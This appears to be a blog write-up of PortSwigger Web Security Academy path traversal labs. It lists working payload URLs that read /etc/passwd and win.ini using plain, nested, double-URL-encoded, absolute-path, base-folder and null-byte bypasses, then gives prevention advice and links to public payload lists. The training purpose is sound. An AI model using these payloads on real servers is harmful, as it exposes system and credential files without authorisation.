---
date: 2025-02-05
linktitle: path_traversal
title: Postswigger Path Traversal
showreadingtime: true
tags: ['PortSwigger', 'Path_Traversal']
categories: ['PortSwigger']
---

# Path Traversal
Path traversal is also known as **directory traversal**. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:

- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.

## Commands to find Path traversal
#### Windows: 
On Windows, both `../` and `..\` are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:

`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`

#### Unix:
This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the `/etc/passwd` file from the server's filesystem:

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`

### Lab 1: File path traversal, simple case
```
https://0ac200140431dfec80b0d5680009009a.web-security-academy.net/image?filename=../../../etc/passwd
```

## Common obstacles to exploiting path traversal vulnerabilities

Many applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.

If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.

You might be able to use an absolute path from the filesystem root, such as `filename=/etc/passwd`, to directly reference a file without using any traversal sequences.

### Lab 2: File path traversal, traversal sequences blocked with absolute path bypass
```
https://0ac200140431dfec80b0d5680009009a.web-security-academy.net/image?filename=/etc/passwd
```

## Common obstacles to exploiting path traversal vulnerabilities - Continued
You might be able to use nested traversal sequences, such as `....//` or `....\/`. These revert to simple traversal sequences when the inner sequence is stripped.

**URL encoding**, the `../` characters. This results in `%2e%2e%2f` and `%252e%252e%252f` respectively. Various non-standard encodings, such as `..%c0%af` or `..%ef%bc%8f`, may also work.

An application may require the user-supplied filename to start with the expected base folder, such as `/var/www/images`. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: `filename=/var/www/images/../../../etc/passwd`

An application may require the user-supplied filename to end with an expected file extension, such as `.png`. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: `filename=../../../etc/passwd%00.png`.

### Lab 3: File path traversal, traversal sequences stripped non-recursively
```
https://0aa400f403e0f92f80f19e78006b0033.web-security-academy.net/image?filename=....//....//....//etc//passwd
```

### Lab 4: File path traversal, traversal sequences stripped with superfluous URL-decode
Double URL encoded - `../../../etc/passwd`
```
https://0ad3008504a4854980a79ef000df00d4.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```

### Lab 5: File path traversal, validation of start of path
```
https://0afe007c04a95d02816284120088007c.web-security-academy.net/image?filename=/var/www/images/../../../etc/passwd
```

### Lab 6: File path traversal, validation of file extension with null byte bypass
```
https://0a3800a00425512580858ab70009000d.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg
```

## How to prevent a path traversal attack

The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.

If you can't avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:

- **Validate the user input** before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
- After validating the supplied input, **append the input to the base directory and use a platform filesystem API to canonicalize the path.** Verify that the canonicalized path starts with the expected base directory.

Below is an example of some simple Java code to validate the canonical path of a file based on user input:

`File file = new File(BASE_DIRECTORY, userInput); if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file }`

## Cheatsheets
1. [Payload of All things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)
2. [Intruder Payloads - Found in Git](https://github.com/1N3/IntruderPayloads)
3. [Path Traversal payload list](https://github.com/omurugur/Path_Travelsal_Payload_List)

> I do not hold any authorization for the the cheatsheets listed in any of my blogs, attaching them as part of educational purposes only which were found on the open internet.
{: .prompt-warning }